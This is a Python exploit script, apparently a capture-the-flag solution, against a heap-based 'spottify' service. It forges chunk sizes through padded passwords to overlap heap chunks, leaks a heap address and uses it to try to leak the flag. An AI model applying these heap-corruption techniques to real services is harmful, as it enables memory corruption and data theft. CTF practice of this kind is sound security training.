from ptrlib import *

def register(username, password, nofill=False):
    sock.sendline("r")
    sock.sendline(username)
    if nofill:
        sock.sendline(password)
    else:
        sock.sendline(password + b'\x00' * (30 - len(password)))
    sock.recvline()

def login(username, password):
    sock.sendline("l")
    sock.sendlineafter(": ", username)
    sock.sendlineafter(": ", password)
    sock.sendlineafter(": ", "n")

def fetchall():
    sock.sendline("Fetch *")

def fetch(cat1, cat2, cat3):
    sock.sendline("Fetch {} {} {}".format(cat1, cat2, cat3))

def logout():
    sock.sendline("Logout")
    sock.recvline()

sock = Process("./spottify")
#sock = Socket("13.48.149.167", 50000)
sock.recvline()

# overlap
for i in range(5):
    register(chr(0x30 + i), b"A" * 0x1a + p16((0x190 - (i + 1)*0x40) | 1))
    logout()
register("ponta", b"A" * 0x1a + p16(0x111))
for i in range(3):
    logout()
    if i >= 1:
        register(b"", b"", nofill=True)
    else:
        register(b"", b"\x00" * 0x1a + p16((0x110 - (i + 1) * 0x40) | 1))

# heap leak
sock.recv()
fetchall()
sock.recvline()
sock.recvline()
addr_heap = u64(sock.recvline()[2:])
addr_flag = addr_heap + 0x3f0
sock.recvline()
sock.recvline()
logger.info("&flag = " + hex(addr_flag))

# flag leak?
logout()
login(p64(addr_flag), b"1" * 8)



sock.interactive()
